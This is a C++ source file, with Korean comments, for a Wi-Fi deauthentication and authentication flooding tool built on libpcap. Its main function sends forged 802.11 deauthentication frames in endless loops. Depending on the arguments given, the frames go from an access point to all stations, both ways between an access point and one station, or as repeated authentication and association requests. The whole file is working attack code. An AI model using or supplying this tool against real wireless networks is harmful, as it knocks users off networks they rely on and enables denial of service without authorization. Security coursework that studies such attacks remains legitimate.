#include "pch.h"

#include "tools.h"
#include "DeauthAttack.h"


/**
 * @brief 임의로 정의한 공격 패킷을 전송.
 * 
 * @param handle pcap_t*
 * @param attack_pkt 임의로 정의한 공격 패킷 구조체.
 * @return int 패킷 전송 성공 여부.
 */
int send_attack_pkt(pcap_t* handle, wlan_attack_pkt* attack_pkt);


int main(int argc, char* argv[])
{
    Param param = {
        .if_ = nullptr,
        .ap_mac_ = nullptr,
        .st_mac_ = nullptr,
        .auth_opt_ = false
    };

    if (!parse(&param, argc, argv))
    {
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(param.if_, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.if_, errbuf);
        return -1;
    }

    DeauthAttack* pkt_generator = new DeauthAttack(param.ap_mac_, param.st_mac_);
    int res = 0;
    switch (argc)
    {
    case 3:
    {
        /* Deauthentication 공격 시작, broadcast */
        printf("Deauthentication attack started. Mode=broadcast\n");
        wlan_attack_pkt* attack_pkt = pkt_generator->get_pkt(DEAUTH_ATTACK_AP_TO_BROADCAST);

        while (res == 0)
        {
            sleep(0);

            /* AP -> ALL. */
            res = send_attack_pkt(handle, attack_pkt);
        }
        break;
    }
    case 4:
    {
        /* Deauthentication 공격 시작, unicast */
        printf("Deauthentication attack started. Mode=unicast\n");
        wlan_attack_pkt* deauth_attack_pkt_ap_to_st = pkt_generator->get_pkt(DEAUTH_ATTACK_AP_TO_STATION);
        wlan_attack_pkt* deauth_attack_pkt_st_to_ap = pkt_generator->get_pkt(DEAUTH_ATTACK_STATION_TO_AP);

        while (true)
        {
            sleep(0);

            /* AP -> station. */
            res = send_attack_pkt(handle, deauth_attack_pkt_ap_to_st);
            if (res != 0)
            {
                break;
            }
            
            /* station -> AP. */
            res = send_attack_pkt(handle, deauth_attack_pkt_st_to_ap);
            if (res != 0)
            {
                break;
            }
        }
        break;
    }
    case 5:
    {
        /* Authentication 공격 시작,, unicast */
        printf("Authentication attack started. Mode=unicast\n");
        wlan_attack_pkt* auth_attack_pkt_st_to_ap_auth = pkt_generator->get_pkt(AUTH_ATTTACK_STATION_TO_AP_AUTH);
        wlan_attack_pkt* auth_attack_pkt_st_to_ap_asso_req = pkt_generator->get_pkt(AUTH_ATTTACK_STATION_TO_AP_ASSO_REQ);

        while (true)
        {
            sleep(0);

            /* station -> AP, authentication packet. */
            res = send_attack_pkt(handle, auth_attack_pkt_st_to_ap_auth);
            if (res != 0)
            {
                break;
            }

            /* station -> AP, association request packet. */
            res = send_attack_pkt(handle, auth_attack_pkt_st_to_ap_asso_req);
            if (res != 0)
            {
                break;
            }
        }
        break;
    }
    default:
        break;
    }
    
	return 0;
}


int send_attack_pkt(pcap_t* handle, wlan_attack_pkt* attack_pkt)
{
    int res = pcap_sendpacket(handle, attack_pkt->packet, attack_pkt->size);
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
        pcap_close(handle);
        return -1;
    }
    return 0;
}
